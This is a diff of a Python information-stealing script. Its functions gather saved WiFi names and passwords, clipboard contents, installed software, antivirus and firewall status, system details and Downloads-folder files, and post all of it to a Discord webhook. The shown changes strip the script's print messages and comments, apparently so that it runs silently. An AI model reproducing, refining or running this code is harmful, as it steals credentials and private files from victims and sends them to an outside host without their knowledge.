@@ -223,7 +223,6 @@ def get_wifi_nameandpassword():
                 wifi_passwords[name] = "Error retrieving password"
         return wifi_passwords
     except Exception as e:
-        print(f"Error retrieving WiFi names and passwords: {e}")
         return {}
 
 send_discord_message(get_wifi_nameandpassword(), title="WiFi Names and Passwords")
@@ -236,10 +235,7 @@ def grabclipboard():
             clipboard_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             send_discord_message({"clipboard": clipboard_data}, title="Clipboard Data")
-        else:
-            print("Clipboard access is currently only supported on Windows.")
     except Exception as e:
-        print(f"Error accessing clipboard: {e}")
         send_discord_message({"error": str(e)}, title="Clipboard Error")
 
 
@@ -277,7 +273,6 @@ def installed_software_info():
                         continue
         send_discord_message({"installed_software": software_list}, title="Installed Software Info")
     except Exception as e:
-        print(f"Error retrieving installed software: {e}")
         send_discord_message({"error": str(e)}, title="Installed Software Error")
 
 
@@ -418,7 +413,6 @@ def peripherals_info():
     except Exception as e:
         send_discord_message({"error": str(e)}, title="Peripherals Error")
 
-# 🛡️ Antivirus, firewall
 def antivirus_firewall_info():
     try:
         antivirus = win32com.client.Dispatch("Microsoft.Update.Session")
@@ -436,7 +430,6 @@ def antivirus_firewall_info():
         "firewall_enabled": firewall_status
     }, title="Antivirus and Firewall Info")
 
-# 📊 Windows system
 def windows_system_info():
     system_info = {
         "os": platform.system(),
@@ -550,11 +543,6 @@ def downloadsdigger(root_dir, max_length=1900):
             "username": "downloadsDigger",
         }
         response = requests.post(webhook_url, json=data)
-        if response.status_code not in [200, 204]:
-            print(f"[!] Failed to send part {i}/{total}: {response.status_code} - {response.text}")
-        else:
-            print(f"[+] Sent part {i}/{total}")
-
 
 def gather_all_info():
     general_system_info()
